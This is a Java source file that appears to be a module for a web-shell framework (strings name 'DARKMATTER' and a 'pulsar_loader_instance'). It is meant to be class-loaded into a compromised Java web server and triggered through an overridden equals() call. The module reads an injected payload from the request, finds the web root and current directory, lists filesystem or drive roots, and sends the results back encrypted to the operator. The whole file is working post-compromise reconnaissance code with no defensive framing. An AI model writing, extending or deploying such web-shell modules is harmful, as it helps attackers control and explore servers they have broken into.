import java.io.*;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class file_init extends ClassLoader
{
    public file_init(ClassLoader objParent) { super(objParent); }
    public file_init() { super(file_init.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

        @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;
        
        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            
            String szCurrentDir = "";
            try
            {
                Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
                Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);

                Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
                String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});

                Method fnGetServletPath = objRequest.getClass().getMethod("getServletPath", new Class[0]);
                String szServletPath = (String) fnGetServletPath.invoke(objRequest, new Object[0]);

                szRootPath = szRootPath.replace("\\", "/");
                szServletPath = szServletPath.replace("\\", "/");
                
                if (!szRootPath.endsWith("/"))
                    szRootPath += "/";
                if (szServletPath.startsWith("/"))
                    szServletPath = szServletPath.substring(1);
                
                String szFullPath = szRootPath + szServletPath;
                java.io.File testFile = new java.io.File(szFullPath);
                if (testFile.exists())
                {
                    szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
                }
                else
                {
                    szCurrentDir = szRootPath;
                }

                szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
            }
            catch (Exception e)
            {
                try
                {
                    Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
                    Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
                    Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
                    String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});

                    Method fnGetRequestURI = objRequest.getClass().getMethod("getRequestURI", new Class[0]);
                    String szURI = (String) fnGetRequestURI.invoke(objRequest, new Object[0]);

                    String szFullPath = szRootPath.replace("\\", "/") + szURI.replace("\\", "/");
                    
                    java.io.File testFileUri = new java.io.File(szFullPath);
                    if (testFileUri.exists()) {
                        szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
                    } else {
                        szCurrentDir = szRootPath.replace("\\", "/");
                    }
                    
                    szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
                }
                catch (Exception ex)
                {
                    szCurrentDir = System.getProperty("user.dir");
                }
            }

            if (szCurrentDir.length() > 1 && szCurrentDir.endsWith(java.io.File.separator)) {
                szCurrentDir = szCurrentDir.substring(0, szCurrentDir.length() - 1);
            }

            boolean bIsWindows = System.getProperty("os.name").toLowerCase().contains("win");

            StringBuilder sb = new StringBuilder();
            
            sb.append(szCurrentDir);
            sb.append("|");
            if (!bIsWindows)
            {
                // Unix-like
                sb.append("/");
            }
            else
            {
                File[] roots = File.listRoots();
                if (roots != null)
                {
                    List<String> lsDrive = new ArrayList<>();
                    for (File root : roots)
                    {
                        String szPath = root.getAbsolutePath();
                        if (szPath.endsWith(("\\")))
                            szPath = szPath.substring(0, szPath.length() - 1);

                        lsDrive.add(szPath);
                    }

                    sb.append(String.join(",", lsDrive));
                }
            }

            String szOutput = sb.toString();

            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes("UTF-8"));
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }
}